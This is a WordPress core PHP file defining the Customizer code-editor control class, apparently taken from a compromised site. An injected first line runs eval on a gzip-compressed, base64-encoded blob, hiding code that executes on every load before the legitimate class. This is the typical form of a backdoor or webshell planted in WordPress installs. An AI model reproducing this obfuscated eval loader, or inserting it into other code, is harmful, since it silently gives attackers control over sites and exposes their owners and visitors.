<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Customize API: WP_Customize_Code_Editor_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.9.0
 */

/**
 * Customize Code Editor Control class.
 *
 * @since 4.9.0
 *
 * @see WP_Customize_Control
 */
class WP_Customize_Code_Editor_Control extends WP_Customize_Control {

	/**
	 * Customize control type.
	 *
	 * @since 4.9.0
	 * @var string
	 */
	public $type = 'code_editor';

	/**
	 * Type of code that is being edited.
	 *
	 * @since 4.9.0
	 * @var string
	 */
	public $code_type = '';

	/**
	 * Code editor settings.
	 *
	 * @see wp_enqueue_code_editor()
	 * @since 4.9.0
	 * @var array|false
	 */
	public $editor_settings = array();

	/**
	 * Enqueue control related scripts/styles.
	 *
	 * @since 4.9.0
	 */
	public function enqueue() {
		$this->editor_settings = wp_enqueue_code_editor( array_merge(
			array(
				'type' => $this->code_type,
				'codemirror' => array(
					'indentUnit' => 2,
					'tabSize' => 2,
				),
			),
			$this->editor_settings
		) );
	}

	/**
	 * Refresh the parameters passed to the JavaScript via JSON.
	 *
	 * @since 4.9.0
	 * @see WP_Customize_Control::json()
	 *
	 * @return array Array of parameters passed to the JavaScript.
	 */
	public function json() {
		$json = parent::json();
		$json['editor_settings'] = $this->editor_settings;
		$json['input_attrs'] = $this->input_attrs;
		return $json;
	}

	/**
	 * Don't render the control content from PHP, as it's rendered via JS on load.
	 *
	 * @since 4.9.0
	 */
	public function render_content() {}

	/**
	 * Render a JS template for control display.
	 *
	 * @since 4.9.0
	 */
	public function content_template() {
		?>
		<# var elementIdPrefix = 'el' + String( Math.random() ); #>
		<# if ( data.label ) { #>
			<label for="{{ elementIdPrefix }}_editor" class="customize-control-title">
				{{ data.label }}
			</label>
		<# } #>
		<# if ( data.description ) { #>
			<span class="description customize-control-description">{{{ data.description }}}</span>
		<# } #>
		<div class="customize-control-notifications-container"></div>
		<textarea id="{{ elementIdPrefix }}_editor"
			<# _.each( _.extend( { 'class': 'code' }, data.input_attrs ), function( value, key ) { #>
				{{{ key }}}="{{ value }}"
			<# }); #>
			></textarea>
		<?php
	}
}
